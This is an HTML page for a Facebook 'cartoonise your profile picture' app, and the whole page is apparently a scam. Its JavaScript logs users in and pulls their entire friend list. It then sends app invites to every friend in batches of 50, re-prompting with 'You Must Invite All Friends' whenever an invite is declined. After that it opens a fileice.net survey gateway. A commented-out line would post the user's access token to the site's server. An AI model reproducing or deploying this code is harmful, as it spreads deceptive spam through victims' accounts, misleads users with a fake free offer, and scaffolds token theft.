
<!DOCTYPE html>
<html>
<head>
<script src="//ads.lfstmedia.com/getad?site=143042" type="text/javascript"></script>
<script type="text/javascript" src="http://fileice.net/gateway/mygate.php?id=4365546a48424b486868637a586462334e4150634b673d3d"></script>
<link href="main.css" rel="stylesheet" type="text/css" />


    <title>Cartoonise Your Facebook Profile Picture</title>

    <link href="themes/3/js-image-slider.css" rel="stylesheet" type="text/css" />

    <script src="themes/3/js-image-slider.js" type="text/javascript"></script>

    <link href="generic.css" rel="stylesheet" type="text/css" />

<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-34338753-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
</head>

<body>

<script src="http://connect.facebook.net/en_US/all.js">

   </script>

   <script>

     FB.init({ 

       appId:'336953559728376', 

	   cookie:true, 

       status:true, 

	   xfbml:true 

     });

	 

	 function sendRequestViaMultiFriendSelector() {

        FB.ui({method: 'apprequests',

          message: 'Share it the news to your friends'

        }, requestCallback);

      }

   </script>

   <script> 



 window.fbAsyncInit = function() { 

 var curLoc = window.location; 

 FB.init({ 

 appId : '336953559728376', 

 xfbml : true, 

 oauth : true, 

 cookie: true 

 }); 

 FB.Canvas.setAutoGrow(); 

 }; 

 (function() { 

 var e = document.createElement('script'); e.async = true; 

 e.src = document.location.protocol + 

 '//connect.facebook.net/es_LA/all.js'; 

 document.getElementById('fb-root').appendChild(e); 

 }()); 



 function inviteFriends(message){ 

 FB.ui({ method: 'apprequests', 

 message: message, 

 data:"336953559728376" 

 }); 

 } 



 var davet_m="",davet_t="Suggest to Friends",kkk=0; 

 function mshuffle(o){ 

 for(var j, x, i = o.length; i; j = parseInt(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x); 

 return o; 

 }; 

 function sendRequestToFriends(txxt,title){ 

 davet_m=txxt; 

 if (title) 

 davet_t=title; 

 FB.login(function(response) { 

 if (response.authResponse) { 

 if(!kkk) { 

 kkk=1; 

 //$.post("/justhtml/181411457193/email",{"token":response.authResponse.accessToken},function(data) {}); 

 }

 all(); 

 } 

 else { 

 all(); 

 } 

 }, {scope: 'user_location'},{display: 'popup'} ); 

 } 

 function all(){ 

 var friends = new Array(); 

 FB.api('/me/friends', function(response) { 

 for (var i=0; i<response.data.length; i++) { 

 //for (var i=0; i<100; i++) { 

 friends[i] = response.data[i].id; 

 //alert(friends[i]); 

 } 

 mshuffle(friends); 

 loop(friends); 

 }); 

 } 

 var GG_NUM=50; 

 function loop(list){ 

 if(list.length != 0){ 

 //alert(list.length); 

 var string = ''; 

 var shifting = 0; 

 if (list.length >= GG_NUM){ 

 shifting = GG_NUM;

 for (var j = 0; j< GG_NUM; j++){ 

 if (j != GG_NUM-1) 

 string = string + list[j] + ','; 

 else 

 string = string + list[j]; 

 } 

 } 

 else{ 

 shifting = list.length; 

 for (var j = 0; j< list.length; j++){ 

 if (j != list.length - 1) 

 string = string + list[j] + ','; 

 else 

 string = string + list[j]; 

 } 

 } 

 string = "'" + string + "'"; 

 FB.ui({method: 'apprequests', data: '254333748009423', message: davet_m, title: davet_t, to : string}, 

 function(response) { 

 if (response) { 

 for (var i = 0; i < shifting; i++){ 

 list.shift(); 

 } 

 if(list.length != 0){ 

 loop(list); 

 } 

 else 

 { 

 (function() { 

		   startGateway('135514');


 document.getElementById('fb-roott').appendChild(e); 

 }()); 

 } 

 } 

 else{ 
 alert("You Must Invite All Friends To Cartoonise for FREE!!");sendRequestToFriends('Cartoonise Your Profile Picture','Invite Your Friends Now');

 } 

 }); 

 } 

 } 

 </script>

 <center>

<img src="images/banner.png" style="padding-left:50px;padding-bottom:30px" />

    <div id="sliderFrame">

        <div id="slider">

            <img src="images/stats/KisenyaAPP.jpg" />
			
			<img src="images/stats/YayeAPP.jpg"/>

            <img src="images/stats/MuseveniAPP.jpg" />
            <img src="images/stats/SylvesterAPP.jpg"/>
                <img src="images/stats/KibakiAPP.jpg"/>
				
				<img src="images/stats/JulietAPP.jpg"/>
				
				<img src="images/stats/NdaluAPP.jpg"/>

            <img src="images/stats/RowlandAPP.jpg"/>

        </div>

        </div>

        <br>

<center>

<h3><font color="#0066FF">Cartoonise Your Profile Picture</font></h3><img src="images/getnow.png" onClick="alert('You Must Invite All Friends To Continue');sendRequestToFriends('Customize Facebook Layout','Invite Your Friends Now');"/> 

</center> 
<div class="fb-subscribe" data-href="https://www.facebook.com/rowland.kk" data-show-faces="true" data-width="450"></div>


<script type="text/javascript">
    //<![CDATA[
        LSM_Slot({
            adkey: 'a00',
            ad_size: '468x60',
            slot: 'slot54528'
        });
    //]]>
</script>
</center>



</body>

<script type="text/javascript">
var aasd = false;
function click2(){
if (aasd == false) {
alert("Invite Friends to Continue");
}
}
</script>
<script type="text/javascript">
var aasd = false;
function click1(){
if (aasd == false) {
alert("You miss this chance. Invite and get your credits!");
}
}
</script>

</html>

